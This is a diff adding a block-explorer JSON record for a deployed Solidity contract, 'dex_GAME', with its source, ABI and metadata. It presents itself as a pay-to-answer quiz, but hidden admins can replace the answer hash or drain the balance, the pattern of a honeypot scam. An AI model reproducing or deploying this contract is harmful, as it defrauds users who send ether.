@@ -1,0 +1,25 @@
+{
+  "TxHash": "0xe7d225a2bc465a4984b3d72c550bed5bc729335c6a6fe2fba639e200aa7cc174",
+  "ContractAddress": "0xF188975E205c6bEE95F8F264B56c2b0361D93A12",
+  "Name": "dex_GAME",
+  "PackageStatus": 0,
+  "status": "1",
+  "message": "OK",
+  "result": [
+    {
+      "SourceCode": "contract dex_GAME\r\n{\r\n    function Try(string memory _response) public payable\r\n    {\r\n        require(msg.sender == tx.origin);\r\n\r\n        if(responseHash == keccak256(abi.encode(_response)) \u0026\u0026 msg.value \u003e 1 ether)\r\n        {\r\n            payable(msg.sender).transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    string public question;\r\n\r\n    bytes32 responseHash;\r\n\r\n    mapping (bytes32=\u003ebool) admin;\r\n\r\n    function Start(string calldata _question, string calldata _response) public payable isAdmin{\r\n        if(responseHash==0x0){\r\n            responseHash = keccak256(abi.encode(_response));\r\n            question = _question;\r\n        }\r\n    }\r\n\r\n    function Stop() public payable isAdmin {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n        responseHash = 0x0;\r\n    }\r\n\r\n    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] memory admins) {\r\n        for(uint256 i=0; i\u003c admins.length; i++){\r\n            admin[admins[i]] = true;        \r\n        }       \r\n    }\r\n\r\n    modifier isAdmin(){\r\n        require(admin[keccak256(abi.encodePacked(msg.sender))]);\r\n        _;\r\n    }\r\n\r\n    fallback() external {}\r\n}",
+      "ABI": "[{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"admins\",\"type\":\"bytes32[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"bytes32\",\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"New\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]",
+      "ContractName": "dex_GAME",
+      "CompilerVersion": "v0.8.19+commit.7dd6d404",
+      "OptimizationUsed": "1",
+      "Runs": "200",
+      "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000035e0e31b5166df938e4d4bf11f87e6c137a59215d7f51a78c4024cd2512ba9a9c7ecc37bcbae22df7712ed5be99917925db58a8425d2e69d1fd6b8968afb42fb79538853edeb62eab46aad42db7197e7db20ae6d942591d8fd5bc206c4eb25996",
+      "EVMVersion": "Default",
+      "Library": "",
+      "LicenseType": "GNU GPLv3",
+      "Proxy": "0",
+      "Implementation": "",
+      "SwarmSource": "ipfs://84425b7d530932f36cb51c8192dc02a225ac090c87157a862e240192b81fb44f"
+    }
+  ]
+}
